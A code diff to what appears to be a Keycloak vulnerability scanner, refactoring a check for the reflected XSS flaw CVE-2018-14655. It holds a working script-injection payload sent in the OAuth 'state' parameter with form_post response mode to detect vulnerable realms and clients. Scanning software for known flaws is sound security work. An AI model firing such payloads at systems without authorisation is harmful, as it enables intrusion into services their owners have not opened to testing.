@@ -1,8 +1,9 @@
-from keycloak_scanner.custom_logging import verbose, find
-from keycloak_scanner.request import Request
+from .scan import Scan
+from .custom_logging import verbose, find
 
 
-class FormPostXssScan:
+
+class FormPostXssScan(Scan):
 
     def perform(self, launch_properties, scan_properties):
 
@@ -19,7 +20,7 @@ class FormPostXssScan:
                 for client in clients:
 
                     payload = 'af0ifjsldkj"/><script type="text/javascript">alert(1)</script> <p class="'
-                    r = Request.request().get(url, params={
+                    r = self.session.get(url, params={
                             'state': payload,
                             'response_type': 'token',
                             'response_mode': 'form_post',
@@ -29,4 +30,4 @@ class FormPostXssScan:
 
                     if r.status_code == 200:
                         if payload in r.text:
-                            find('Vulnerable to CVE 2018 14655 realm:{}, client:{}'.format(realm, client))
+                            find('XSS-CVE2018-14655', 'Vulnerable to CVE 2018 14655 realm:{}, client:{}'.format(realm, client))
